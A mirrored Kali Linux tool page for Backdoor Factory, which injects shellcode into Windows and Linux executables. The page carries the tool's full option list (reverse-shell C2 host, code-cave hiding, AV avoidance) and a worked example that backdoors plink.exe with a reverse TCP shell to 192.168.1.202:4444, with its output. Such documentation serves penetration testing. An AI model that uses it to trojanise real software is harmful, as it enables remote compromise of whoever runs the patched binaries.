<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>kaliå·¥å…·ç®±</title>
<script src="bootstrap.min.js" tppabs="http://www.storysec.com/kali/kalitools/static/bootstrap.min.js"></script>
<link rel="stylesheet" href="main.css" tppabs="http://www.storysec.com/kali/kalitools/static/main.css">
<link rel="stylesheet" href="bootstrap.min.css" tppabs="http://www.storysec.com/kali/kalitools/static/bootstrap.min.css">
<style type="text/css" id="syntaxhighlighteranchor"></style>
</head>
<main class="main-container ng-scope" ng-view="">
<div class="main receptacle post-view ng-scope">
<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
<section class="l-section"><div class="l-section-h i-cf"><h2>Backdoor Factory Package Description</h2>
<p style="text-align: justify;">The goal of BDF is patch executable binaries with user desidered shellcode and continue normal execution of the prepatched state.</p>
<p>Supporting: Windows PE x32/x64 and Linux ELF x32/x64 (System V)</p>
<p>Some executables have built in protections, as such this will not work on all binaries. It is advisable that you test target binaries before deploying them to clients or using them in exercises.</p>
<p>Source: https://github.com/secretsquirrel/the-backdoor-factory/<br>
<a href="javascript:if(confirm('https://github.com/secretsquirrel/the-backdoor-factory/  \n\n¸ÃÎÄ¼þÎÞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·þÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='https://github.com/secretsquirrel/the-backdoor-factory/'" tppabs="https://github.com/secretsquirrel/the-backdoor-factory/" variation="deepblue" target="blank">backdoor-factory Homepage</a> â€“ <a href="javascript:if(confirm('http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary  \n\n¸ÃÎÄ¼þÎÞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·þÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary'" tppabs="http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary" variation="deepblue" target="blank">Kali backdoor-factory Repo</a></p>
<ul>
<li>Author: Joshua Pitts</li>
<li>License: GPLv3</li>
</ul>
<h3>Tools included in the backdoor-factory package</h3>
<h5>backdoor-factory â€“ Patch win32/64 binaries with shellcode</h5>
<code><a class="__cf_email__" href="javascript:if(confirm('http://www.storysec.com/cdn-cgi/l/email-protection  \n\n¸ÃÎÄ¼þÎÞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·þÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='http://www.storysec.com/cdn-cgi/l/email-protection'" tppabs="http://www.storysec.com/cdn-cgi/l/email-protection" data-cfemail="9ae8f5f5eedaf1fbf6f3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# backdoor-factory<br>
-.(`-') Â (`-') Â _ Â  Â  Â  Â  Â  &lt;-.(`-') _(`-') Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â (`-')<br>
__( OO) Â (OO ).-/ Â _ Â  Â  Â  Â  __( OO)( (OO ).-&gt; Â  Â  .-&gt; Â  Â  Â  Â .-&gt; Â  &lt;-.(OO )<br>
'-'---.\ Â / ,---. Â  \-,-----.'-'. ,--.\ Â  Â .'_ (`-')----. (`-')----. ,------,)<br>
| .-. (/ Â | \ /`.\ Â  | Â .--./| Â .' Â  /'`'-..__)( OO).-. Â '( OO).-. Â '| Â  /`. '<br>
| '-' `.) '-'|_.' | /_) (`-')| Â  Â  Â /)| Â | Â ' |( _) | | Â |( _) | | Â || Â |_.' |<br>
| /`'. Â |(| Â .-. Â | || Â |OO )| Â . Â  ' | Â | Â / : \| Â |)| Â | \| Â |)| Â || Â . Â  .'<br>
| '--' Â / | Â | | Â |(_' Â '--'\| Â |\ Â  \| Â '-' Â / Â ' Â '-' Â ' Â ' Â '-' Â '| Â |\ Â \<br>
`------' Â `--' `--' Â  `-----'`--' '--'`------' Â  Â `-----' Â  Â `-----' `--' '--'<br>
Â  Â  Â  Â  Â  Â (`-') Â _ Â  Â  Â  Â  Â  (`-') Â  Â  Â  Â  Â  Â  Â  Â  Â  (`-')<br>
Â  Â &lt;-. Â  Â  (OO ).-/ Â _ Â  Â  Â  Â ( OO).-&gt; Â  Â  Â  .-&gt; Â  &lt;-.(OO ) Â  Â  Â .-&gt;<br>
(`-')-----./ ,---. Â  \-,-----./ Â  Â '._ Â (`-')----. ,------,) ,--.' Â ,-.<br>
(OO|(_\---'| \ /`.\ Â  | Â .--./|'--...__)( OO).-. Â '| Â  /`. '(`-')'.' Â /<br>
Â / | Â '--. '-'|_.' | /_) (`-')`--. Â .--'( _) | | Â || Â |_.' |(OO \ Â  Â /<br>
Â \_) Â .--'(| Â .-. Â | || Â |OO ) Â  | Â | Â  Â \| Â |)| Â || Â . Â  .' | Â / Â  /)<br>
Â  `| Â |_) Â | Â | | Â |(_' Â '--'\ Â  | Â | Â  Â  ' Â '-' Â '| Â |\ Â \ Â `-/ Â  /`<br>
Â  Â `--' Â  Â `--' `--' Â  `-----' Â  `--' Â  Â  Â `-----' `--' '--' Â  `--'<br>
<br>
Â  Â  Â  Â  Â Author: Â  Â Joshua Pitts<br>
Â  Â  Â  Â  Â Email: Â  Â  the.midnite.runr[a t]gmail&lt;d o t&gt;com<br>
Â  Â  Â  Â  Â Twitter: Â  @midnite_runr<br>
<br>
Â  Â  Â  Â  Â v2.0.6<br>
<br>
Usage: backdoor.py [options]<br>
<br>
Options:<br>
Â  -h, --help Â  Â  Â  Â  Â  Â show this help message and exit<br>
Â  -f FILE, --file=FILE Â File to backdoor<br>
Â  -s SHELL, --shell=SHELL<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Payloads that are available for use.<br>
Â  -H HOST, --hostip=HOST<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  IP of the C2 for reverse connections<br>
Â  -P PORT, --port=PORT Â The port to either connect back to for reverse shells<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  or to listen on for bind shells<br>
Â  -J, --cave_jumping Â  Â Select this options if you want to use code cave<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  jumping to further hide your shellcode in the binary.<br>
Â  -a, --add_new_section<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Mandating that a new section be added to the exe<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  (better success) but less av avoidance<br>
Â  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  User supplied shellcode, make sure that it matches the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  architecture that you are targeting.<br>
Â  -c, --cave Â  Â  Â  Â  Â  Â The cave flag will find code caves that can be used<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  for stashing shellcode. This will print to all the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  code caves of a specific size.The -l flag can be use<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  with this setting.<br>
Â  -l SHELL_LEN, --shell_length=SHELL_LEN<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  For use with -c to help find code caves of different<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  sizes<br>
Â  -o OUTPUT, --output-file=OUTPUT<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  The backdoor output file<br>
Â  -n NSECTION, --section=NSECTION<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  New section name must be less than seven characters<br>
Â  -d DIR, --directory=DIR<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  This is the location of the files that you want to<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backdoor. You can make a directory of file backdooring<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  faster by forcing the attaching of a codecave to the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  exe by using the -a setting.<br>
Â  -w, --change_access Â  This flag changes the section that houses the codecave<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  to RWE. Sometimes this is necessary. Enabled by<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  default. If disabled, the backdoor may fail.<br>
Â  -i, --injector Â  Â  Â  Â This command turns the backdoor factory in a hunt and<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  shellcode inject type of mechinism. Edit the target<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  settings in the injector module.<br>
Â  -u SUFFIX, --suffix=SUFFIX<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  For use with injector, places a suffix on the original<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  file for easy recovery<br>
Â  -D, --delete_original<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  For use with injector module. Â This command deletes<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  the original file. Â Not for use in production systems.<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  *Author not responsible for stupid uses.*<br>
Â  -O DISK_OFFSET, --disk_offset=DISK_OFFSET<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Starting point on disk offset, in bytes. Some authors<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  want to obfuscate their on disk offset to avoid<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  reverse engineering, if you find one of those files<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  use this flag, after you find the offset.<br>
Â  -S, --support_check Â  To determine if the file is supported by BDF prior to<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backdooring the file. For use by itself or with<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  verbose. This check happens automatically if the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backdooring is attempted.<br>
Â  -q, --no_banner Â  Â  Â  Kills the banner.<br>
Â  -v, --verbose Â  Â  Â  Â  For debug information output.</code>
<h3>backdoor-factory Usage Example</h3>
<p>Specify the binary to backdoor <b><i>(-f /usr/share/windows-binaries/plink.exe)</i></b>, set the connect-back IP <b><i>(-H 192.168.1.202)</i></b>, the connect-back port <b><i>(-P 4444)</i></b>, and the shell to use <b><i>(-s reverse_shell_tcp)</i></b>:</p>
<code><a class="__cf_email__" href="javascript:if(confirm('http://www.storysec.com/cdn-cgi/l/email-protection  \n\n¸ÃÎÄ¼þÎÞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·þÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='http://www.storysec.com/cdn-cgi/l/email-protection'" tppabs="http://www.storysec.com/cdn-cgi/l/email-protection" data-cfemail="97e5f8f8e3d7fcf6fbfe">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp<br>
__________ Â  Â  Â  Â  Â  Â  Â  Â __ Â  Â  Â  .___ Â  Â  Â  Â  Â  Â  Â  Â  Â  <br>
\______ Â  \_____ Â  Â ____ | Â | __ __| _/____ Â  ___________ <br>
Â | Â  Â | Â _/\__ Â \ _/ ___\| Â |/ // __ |/ Â _ \ / Â _ \_ Â __ \ <br>
Â | Â  Â | Â  \ / __ \\ Â \___| Â  Â &lt;/ /_/ ( Â &lt;_&gt; | Â &lt;_&gt; ) Â | \/<br>
Â |______ Â /(____ Â /\___ Â &gt;__|_ \____ |\____/ \____/|__| Â  <br>
Â  Â  Â  Â  \/ Â  Â  Â \/ Â  Â  \/ Â  Â  \/ Â  Â \/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <br>
___________ Â  Â  Â  Â  Â  Â  Â __ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <br>
\_ Â  _____/____ Â  Â _____/ Â |_ Â ___________ ___.__. Â  Â  Â  Â <br>
Â | Â  Â __) \__ Â \ _/ ___\ Â  __\/ Â _ \_ Â __ &lt; Â  | Â | Â  Â  Â  Â <br>
Â | Â  Â  \ Â  / __ \\ Â \___| Â | ( Â &lt;_&gt; ) Â | \/\___ Â | Â  Â  Â  Â <br>
Â \___ Â / Â (____ Â /\___ Â &gt;__| Â \____/|__| Â  / ____| Â  Â  Â  Â <br>
Â  Â  Â \/ Â  Â  Â  Â \/ Â  Â  \/ Â  Â  Â  Â  Â  Â  Â  Â  Â  \/ Â  Â  Â  Â  Â  Â  <br>
<br>
Â  Â  Â  Â  Â Author: Â  Â Joshua Pitts<br>
Â  Â  Â  Â  Â Email: Â  Â  the.midnite.runr[a t]gmail&lt;d o t&gt;com<br>
Â  Â  Â  Â  Â Twitter: Â  @midnite_runr<br>
Â  Â  Â  Â  Â <br>
Â  Â  Â  Â  Â v2.0.6 <br>
Â  Â  Â  Â  Â <br>
[*] In the backdoor module<br>
[*] Checking if binary is supported<br>
[*] Gathering file info<br>
[*] Reading win32 entry instructions<br>
[*] Looking for and setting selected shellcode<br>
[*] Creating win32 resume execution stub<br>
[*] Looking for caves that will fit the minimum shellcode length of 358<br>
[*] All caves lengths: Â (358,)<br>
############################################################<br>
The following caves can be used to inject code and possibly<br>
continue execution.<br>
**Don't like what you see? Use jump, single, or append.**<br>
############################################################<br>
[*] Cave 1 length as int: 358<br>
[*] Available caves: <br>
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x280 End: 0x1000; Cave Size: 3456<br>
2. Section Name: .text; Section Begin: 0x1000 End: 0x37000; Cave begin: 0x36981 End: 0x37000; Cave Size: 1663<br>
3. Section Name: None; Section Begin: None End: None; Cave begin: 0x47cec End: 0x48004; Cave Size: 792<br>
4. Section Name: .data; Section Begin: 0x48000 End: 0x4a000; Cave begin: 0x48961 End: 0x48b90; Cave Size: 559<br>
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x4907c End: 0x4a00e; Cave Size: 3986<br>
**************************************************<br>
[!] Enter your selection: 2<br>
Using selection: 2<br>
[*] Changing Section Flags<br>
[*] Patching initial entry instructions<br>
[*] Creating win32 resume execution stub<br>
[*] /usr/share/windows-binaries/plink.exe backdooring complete<br>
File /usr/share/windows-binaries/plink.exe is in the 'backdoored' directory</code>
</div></section><div style="display:none">
<script src="z_stat.php-id=1260038378&web_id=1260038378" tppabs="http://s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
</div>
</main></body></html>
